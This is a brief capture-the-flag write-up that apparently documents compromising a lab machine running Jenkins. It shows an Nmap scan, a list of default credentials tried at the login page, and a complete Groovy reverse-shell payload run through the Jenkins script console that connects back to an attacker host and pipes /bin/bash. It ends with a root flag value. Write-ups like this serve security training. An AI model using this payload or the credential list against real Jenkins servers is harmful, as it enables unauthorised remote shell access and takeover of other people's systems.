## ** Machine IP **
> 10.129.93.180
## ** Inference **
1. Nmap Scan `nmap -sC -sV 10.129.93.180`
2. *Jetty 9.4.39.v20210325* open on port 8080
3. Opened `10.129.93.180:8080` in browser. Offered a login screen with Jetty service.
4. Used Default credentials 
>	admin:password<br>
>	admin:admin<br>
>	root:root<br>
>	root:password<br>
>	admin:admin1<br>
>	admin:password1<br>
>	root:password1<br>
5. Signed in with credential
>	**username**:root<br>
>	**password**:password<br>
6. Using jenkins Version `Jenkins 2.289.1`
7. Manage Jenkine > Script Console
8. Accepts only grrovy script So used the following payload<br>
```groovy
String host="{attacker-ip}";
int port=4242;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
## **Result**
Root Flag found in `/root/flag.txt` :- *9cdfb439c7876e703e307864c9167a15*
